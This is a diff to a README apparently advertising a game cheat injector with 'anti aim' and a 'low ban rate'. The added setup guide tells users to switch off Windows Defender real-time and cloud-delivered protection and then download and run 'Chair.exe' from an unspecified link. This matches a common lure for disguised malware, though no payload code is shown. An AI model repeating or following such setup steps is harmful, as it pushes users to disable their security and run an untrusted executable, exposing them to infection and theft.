@@ -1,10 +1,27 @@
-_____VERY LOW BAN RATE!!!_____
-
+___HUGE UPDATE!!! ANTI AIM ADDED!!!___
+![showcase1](screenshots/showcase1.png)
 
 __INSTRUCTIONS FOR USE__ </br>
-BEFORE INSTALLING PLEASE ENSURE THAT WINDOWS DEFENDER REAL TIME PROTECTION IS OFF OTHERWISE THE TOOL ___WILL NOT WORK PROPERLY!___</br>
-   
-### Step 1: Launching the Injector
+___> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.___
+
+## Quick Setup Guide
+
+### Step 1: Disable Windows Defender Settings
+To ensure functionality of the loader, make sure **Real-time protection** and **Cloud-delivered protection** are turned off in Windows Defender:
+
+1. **Real-time protection**
+   - Go to **Windows Security** > **Virus & threat protection** > **Manage settings**.
+   - Toggle off **Real-time protection**.
+
+2. **Cloud-delivered protection**
+   - In the same settings page, toggle off **Cloud-delivered protection**.
+
+   ![Windows Defender Settings](screenshots/defender.png)
+
+> ⚠️ **Note:** Both settings must be off. Otherwise, the tool will not operate as expected.
+
+---
+### Step 2: Launching the Injector
 
 1. **Download the Tool**  
    - Get `Chair.exe` from the provided link.
